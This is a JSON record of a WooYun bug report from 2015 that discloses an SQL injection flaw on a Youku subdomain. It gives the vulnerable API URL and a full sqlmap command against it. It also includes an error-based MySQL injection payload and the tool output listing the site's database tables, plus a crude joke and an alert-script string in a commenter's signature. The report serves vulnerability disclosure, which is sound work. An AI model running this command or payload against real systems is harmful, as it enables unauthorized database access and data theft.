{"id": 44052, "wybug_id": "wooyun-2015-0102649", "wybug_title": "优酷网某站SQL注射漏洞", "wybug_corp": "优酷", "wybug_author": "卡卡", "wybug_date": "2015-03-20 18:23", "wybug_open_date": "2015-05-04 18:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-04：\t细节向公众公开  简要描述：     一男子去吃饭，点了牛鞭这道菜，菜端上来了，男子故意调戏问服务员，这是什么，女服务员害羞的没说话，男子得意的夹了一块刚想往嘴里放，服务员说这个东西是往牛B里放的。 详细说明：  注射链接：\nhttp://allthingshair.youku.com/api/index.php?r=video/GetAccountVideoLastWeekByCategoryIdHasSpecialVideo\n\n\n\nsqlmap.py -u \"http://allthingshair.youku.com/api/index.php?r=video/GetAccountVideoLastWeekByCategoryIdHasSpecialVideo\" --data \"categoryId=\" --technique E --dbms=\"mysql\" --tables -D allthingshair         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150301}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:44:09[18:44:10] [WARNING] provided value for parameter 'categoryId' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[18:44:10] [INFO] testing connection to the target URL[18:44:11] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the testssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: categoryId (POST)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: categoryId=' AND (SELECT 8931 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(8931=8931,1))),0x71626a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'MzQo'='MzQo---[18:44:12] [INFO] testing MySQL[18:44:12] [INFO] confirming MySQL[18:44:12] [INFO] the back-end DBMS is MySQLweb application technology: Apacheback-end DBMS: MySQL >= 5.0.0[18:44:12] [INFO] fetching tables for database: 'allthingshair'[18:44:13] [INFO] the SQL query used returns 14 entries[18:44:14] [INFO] retrieved: attribute_list[18:44:15] [INFO] retrieved: category_list[18:44:15] [INFO] retrieved: comment_list[18:44:20] [INFO] retrieved: daily_video_account[18:44:20] [INFO] retrieved: hot_topic_video[18:44:21] [INFO] retrieved: keyword_count[18:44:22] [INFO] retrieved: member_youku[18:44:23] [INFO] retrieved: product_list[18:44:24] [INFO] retrieved: subscribe_list[18:44:24] [INFO] retrieved: video_attribute_list[18:44:25] [INFO] retrieved: video_favour[18:44:26] [INFO] retrieved: video_main_list[18:44:27] [INFO] retrieved: video_minor_list[18:44:28] [INFO] retrieved: vlogger_listDatabase: allthingshair[14 tables]+----------------------+| attribute_list       || category_list        || comment_list         || daily_video_account  || hot_topic_video      || keyword_count        || member_youku         || product_list         || subscribe_list       || video_attribute_list || video_favour         || video_main_list      || video_minor_list     || vlogger_list         |+----------------------+\n   漏洞证明：  \n\n   修复方案：  你们懂得   版权声明：转载请注明来源 卡卡@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-20 18:38 厂商回复： 感谢提交，马上处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-20 21:19 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  太重口味了    \n     2015-03-20 22:44 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  @小川 下次清淡点    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}